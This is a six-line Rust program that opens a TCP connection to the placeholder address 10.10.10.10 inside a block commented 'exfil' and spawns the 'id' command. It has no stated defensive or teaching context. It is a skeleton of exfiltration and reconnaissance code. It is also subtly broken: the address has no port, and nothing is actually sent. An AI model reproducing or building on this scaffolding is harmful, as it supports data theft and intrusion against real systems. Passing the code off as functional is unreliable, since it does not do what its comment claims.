use std::net::TcpStream;
use std::process::Command;
fn main() {
    if let Ok(_s) = TcpStream::connect("10.10.10.10") { /* exfil */ }
    Command::new("id").spawn().ok();
}
